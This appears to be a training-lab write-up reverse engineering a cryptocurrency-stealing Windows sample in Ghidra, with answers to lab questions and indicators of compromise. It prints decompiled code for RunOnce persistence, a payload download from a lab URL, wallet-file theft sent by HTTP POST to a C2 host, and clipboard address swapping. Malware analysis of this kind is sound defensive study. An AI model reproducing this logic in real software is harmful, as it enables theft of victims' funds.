# Ghidra Lab — Malware Reverse Engineering Write-Up

## 1. Analysis of `main()`

The initial decompiled `main()` function contains the following key behaviors:

```c
undefined4 main(void)
{
    HRESULT HVar1;
    BYTE downloaded_env_str[32768];
    BYTE local_414[1024];
    DWORD totalchar_env_str;
    DWORD local_10;
    HKEY Run_Once_handle;
    int local_8;

    local_10 = GetModuleFileNameA(
        (HMODULE)0x0,
        (LPSTR)local_414,
        0x400
    );

    RegOpenKeyA(
        (HKEY)HKEY_CURRENT_USER,
        s_SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,
        &Run_Once_handle
    );

    RegSetValueExA(
        Run_Once_handle,
        s_SysReqClient,
        0,
        REG_SZ,
        local_414,
        local_10
    );

    RegCloseKey(Run_Once_handle);

    totalchar_env_str = ExpandEnvironmentStringsA(
        s_%TEMP%\srcupdate.exe,
        (LPSTR)downloaded_env_str,
        0x8000
    );

    HVar1 = URLDownloadToFileA(
        (LPUNKNOWN)0x0,
        s_http://crimestaging.mandiant.com/update/srclient/update.exe,
        (LPCSTR)downloaded_env_str,
        0,
        (LPBINDSTATUSCALLBACK)0x0
    );

    if (HVar1 == 0) {
        RegOpenKeyA(
            (HKEY)HKEY_CURRENT_USER,
            s_SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,
            &Run_Once_handle
        );

        RegSetValueExA(
            Run_Once_handle,
            s_SysReqUpdt,
            0,
            REG_SZ,
            downloaded_env_str,
            totalchar_env_str
        );

        RegCloseKey(Run_Once_handle);
    }

    FUN_00401290();

    FUN_00401000(bitcoin, wallet.dat, %APPDATA%\Bitcoin);
    FUN_00401000(metamask, locals.dat, chrome_appdata);

    FUN_00401290();
    FUN_00401490();
    FUN_00401230();

    for (local_8 = 0; local_8 < 4; local_8++) {
        FUN_00401000(
            (&binance)[local_8 * 3],
            (&coiinmgt.db)[local_8 * 3],
            (&path_coins)[local_8 * 3]
        );
    }

    return 0;
}
```

### Persistence

The malware opens:

```text
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

It creates registry values including:

```text
SysReqClient
SysReqUpdt
```

`SysReqClient` is set to the current executable path obtained through `GetModuleFileNameA()`.

After successfully downloading the additional executable, `SysReqUpdt` is set to the downloaded file path.

### Downloaded Payload

The malware expands:

```text
%TEMP%\srcupdate.exe
```

and downloads a file from:

```text
http://crimestaging.mandiant.com/update/srclient/update.exe
```

The downloaded file is therefore placed in the user's temporary directory and registered for execution through `RunOnce`.

---

## 2. Function `401290`

Function `401290` is a wrapper that calls the string-decoding function repeatedly:

```c
void FUN_00401290(void)
{
    FUN_004011f0(PTR_DAT_004131cc);
    FUN_004011f0(PTR_DAT_004131d0);
    FUN_004011f0(PTR_DAT_004131d4);
    FUN_004011f0(PTR_DAT_004131d8);
    FUN_004011f0(PTR_DAT_004131dc);
    FUN_004011f0(PTR_DAT_004131e0);

    return;
}
```

### Overall Logic

Without examining `4011F0`, the important observation is that `401290` passes multiple pointers to `4011F0`. Each pointer refers to encoded string data. The function therefore acts as a dispatcher for decoding the embedded strings.

---

## 3. Function `4011F0` — String Decoding

The encoded string data is stored contiguously from approximately:

```text
0x4130C0
```

through:

```text
0x413199
```

The decoding operation XORs the encoded bytes with:

```text
0xCC
```

The decoded strings include paths and identifiers associated with cryptocurrency wallets.

Examples from the analysis include:

```text
bitcoin
%APPDATA%\Bitcoin
wallet.dat

metamask
locals.dat
%APPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn
```

### Decoded Data

The decoded strings identify cryptocurrency-related files and application data that the malware attempts to locate and process.

---

## 4. Function `401000`

`FUN_00401000()` is called multiple times by `main()` and receives three parameters.

The notes identify the parameters as being used approximately as follows:

| Parameter | Observed Purpose |
|---|---|
| `param_1` | Cryptocurrency/application identifier |
| `param_2` | File name to open |
| `param_3` | Path/location used to access the file |

### File Access

The third parameter is used when opening the target file.

The second parameter is associated with creating/using an environment variable.

The function reads data from the specified wallet file using `ReadFile()`.

The collected data is then passed to another function:

```c
FUN_00401110(bitcoin, malloced_addr, local_14);
```

Thus, the overall purpose of `401000` is to locate and read cryptocurrency-wallet-related data and pass the contents to `401110`.

---

## 5. Function `401110`

`FUN_00401110()` takes three parameters:

1. A string describing the cryptocurrency type.
2. A pointer to a buffer containing data read from the wallet file.
3. The size of the data buffer.

### Network Initialization

The first relevant API call is:

```c
InternetOpenA("Mozila/5.0", 0, 0, 0, 0);
```

`InternetOpenA()` initializes the WinINet functionality used by the application.

### C2 Communication

The function communicates with:

```text
crime.mandiant.com
```

The notes identify the communication as:

```text
HTTP POST
```

The function attempts to send information obtained from the cryptocurrency wallet data to the remote host. The notes also describe username/password information as being targeted.

---

## 6. Function `401490` and GUI Behavior

`main()` calls:

```c
FUN_00401490();
```

This function was not required to be fully reverse engineered. According to the lab notes, it is boilerplate code that creates a Windows object and enters the Windows message loop, transitioning the program into an event-driven GUI model.

The created window has a callback/window procedure at:

```text
4012F0
```

The callback contains a `switch` statement with Windows message constants beginning with `WM_`.

---

## 7. Function `4012F0` — Clipboard Manipulation

The API calls used by `4012F0` indicate that the function reads and manipulates clipboard data.

The function again uses the previously identified decoding logic. The resulting decoded value is:

```text
1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY
```

This value has the format of a Bitcoin address.

### Behavior

The function monitors clipboard activity and replaces cryptocurrency addresses with a predefined address.

In effect, when a Bitcoin address is copied, the malware can replace the copied address with:

```text
1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY
```

This is consistent with cryptocurrency-address clipboard hijacking.

---

## 8. Additional Cryptocurrency Targets

After the GUI/message-pump code, `main()` processes additional cryptocurrency-related targets:

```text
%APPDATA%\Binance\Local\Acct
%Bither%\account.db
%APPDATA%\Solar\wallet
%APPDATA%\Electrum\dbx.db
%APPDATA%\Electrum\wallet
```

The notes specifically identify targets associated with:

- Binance
- Bither
- Solar
- Electrum

The exact formatting of some paths in the original decompilation is corrupted, so these entries should be treated as the cleaned interpretation of the supplied notes rather than independently verified paths.

---

# 9. Overall Malware Behavior

Based on the reverse-engineering observations in this lab, the program exhibits several malicious behaviors:

1. **Persistence:**  
   It creates entries under the current user's `RunOnce` registry key.

2. **Payload Download:**  
   It downloads an executable from the specified remote URL and saves it as `srcupdate.exe` in `%TEMP%`.

3. **Cryptocurrency Wallet Targeting:**  
   It searches for cryptocurrency wallet files and application data, including Bitcoin, MetaMask, Binance, Bither, Solar, and Electrum-related data.

4. **Data Collection and Exfiltration:**  
   Wallet data is read from files and passed to a network-communication function that sends information to a remote host using HTTP POST.

5. **Clipboard Hijacking:**  
   It monitors and manipulates clipboard contents and can replace a copied cryptocurrency address with a predefined Bitcoin address.

Overall, the program is a **cryptocurrency-targeting malware** that combines persistence, payload downloading, wallet-data theft, network exfiltration, and cryptocurrency-address clipboard hijacking. fileciteturn0file0L209-L219

---

# 10. Lab Questions and Answers

### 1. What is the address of the `main()` function?


```text
0x00401540
```



### 2. What Registry values are being set by `main()`?

The malware uses:

```text
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

The identified values are:

```text
SysReqClient
SysReqUpdt
```

`SysReqClient` points to the current executable, while `SysReqUpdt` points to the downloaded executable.

### 3. What URL is requested, and what does it do with the response?

The requested URL is:

```text
http://crimestaging.mandiant.com/update/srclient/update.exe
```

The response is downloaded to:

```text
%TEMP%\srcupdate.exe
```

If the download succeeds, the resulting path is added to the `RunOnce` registry key.

### 4. Without examining `4011F0`, describe the overall logic of `401290`.

`401290` calls `4011F0` multiple times, passing pointers to encoded string data. It therefore serves as a wrapper/dispatcher for decoding the embedded strings.

### 5. What does `4011F0` do?

It decodes embedded ASCII strings using an XOR operation with:

```text
0xCC
```

The decoded strings include cryptocurrency wallet names, file names, and application-data paths.

### 6. Describe or give an example of the decoded data.

Examples include:

```text
bitcoin
%APPDATA%\Bitcoin
wallet.dat

metamask
locals.dat
```

and the MetaMask Chrome extension storage path:

```text
%APPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn
```

### 7. What is `param_3` used for in `401000`?

It is used as the path/location when opening the target file.

### 8. What is `param_2` used for?

The notes identify it as being associated with creating/using an environment variable and specifying the file name.

### 9. What data is read by `ReadFile()`?

The function reads data from the specified cryptocurrency wallet file, such as the Bitcoin wallet data.

### 10. What does the function do with the data?

The data is passed to `401110` for further processing and network communication.

### 11. What does the first function called in `401110` do?

The first relevant API call is:

```c
InternetOpenA("Mozila/5.0", 0, 0, 0, 0);
```

It initializes WinINet structures and prepares the application for Internet communication.

### 12. What host does the function communicate with?

```text
crime.mandiant.com
```

### 13. What protocol does it use?

The notes identify:

```text
HTTP POST
```

### 14. What data does it send to the remote host?

The function attempts to send data obtained from cryptocurrency wallet files. The supplied notes also identify username/password information as a target.

### 15. What data does `4012F0` appear to read and manipulate?

Clipboard data.

### 16. What is the first function called, and what is its result?

The function uses the previously identified string-decoding routine. One decoded result is:

```text
1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY
```

This has the format of a Bitcoin address.

### 17. What does `4012F0` do?

It manipulates clipboard contents and can replace a copied cryptocurrency address with the predefined Bitcoin address:

```text
1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY
```

### 18. Summarize as succinctly as possible: What does this program do?

The program is cryptocurrency-targeting malware. It establishes persistence through the Windows `RunOnce` registry key, downloads an additional payload, searches for cryptocurrency wallet data, sends collected information to a remote server, and monitors the clipboard to replace cryptocurrency addresses with an attacker-controlled Bitcoin address.

### 19. List all discovered Host and Network Indicators.

#### Host Indicators

```text
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SysReqClient
SysReqUpdt
%TEMP%\srcupdate.exe
%APPDATA%\Bitcoin
wallet.dat
locals.dat
%APPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn
```

#### Network Indicators

```text
http://crimestaging.mandiant.com/update/srclient/update.exe
crime.mandiant.com
HTTP POST
```

#### Cryptocurrency Indicator

```text
1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY
```

---

# 11. Key Findings

| Category | Finding |
|---|---|
| Persistence | `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` |
| Registry values | `SysReqClient`, `SysReqUpdt` |
| Download location | `%TEMP%\srcupdate.exe` |
| Download URL | `http://crimestaging.mandiant.com/update/srclient/update.exe` |
| C2 host | `crime.mandiant.com` |
| Protocol | HTTP POST |
| Primary target | Cryptocurrency wallet data |
| Clipboard behavior | Cryptocurrency-address replacement |
| Replaced address | `1Nc74pWpEZ73CNmQviecrny0WrnqRhwnlY` |
| String obfuscation | XOR with `0xCC` |
